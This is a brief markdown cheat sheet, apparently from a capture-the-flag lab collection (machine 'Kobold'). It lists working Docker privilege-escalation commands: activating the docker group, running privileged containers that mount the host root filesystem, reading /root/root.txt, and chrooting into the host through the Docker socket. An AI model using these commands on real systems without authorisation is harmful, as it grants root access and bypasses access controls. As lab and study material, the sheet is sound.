# docker

Container runtime abused for privilege escalation. Membership in the `docker` group or access to an exposed Docker API effectively equals root on the host.

## Commands Used

### Activate the docker group in the current session
<!-- cmd: linux -->
```bash
newgrp docker
```
Used on: **Kobold**

### Privileged container with host filesystem bind
<!-- cmd: linux -->
```bash
docker run --rm -it --privileged -v /:/hostfs --user root \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
```
Used on: **Kobold**

`--privileged` — full capability set
- `-v /:/hostfs` — mount host `/` at `/hostfs` inside the container
- `--entrypoint sh` — override entrypoint to get a shell

### One-liner to read a specific host file
<!-- cmd: linux -->
```bash
docker run --rm -i --privileged -v /:/hostfs --user root \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
  -c "cat /hostfs/root/root.txt"
```
Used on: **Kobold**

### Alternative using chroot
<!-- cmd: linux -->
```bash
docker run -v /:/host -it alpine chroot /host /bin/bash
```
Used on: **Kobold**

### Using a mounted Docker socket
<!-- cmd: linux -->
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
```
Used on: **Kobold**


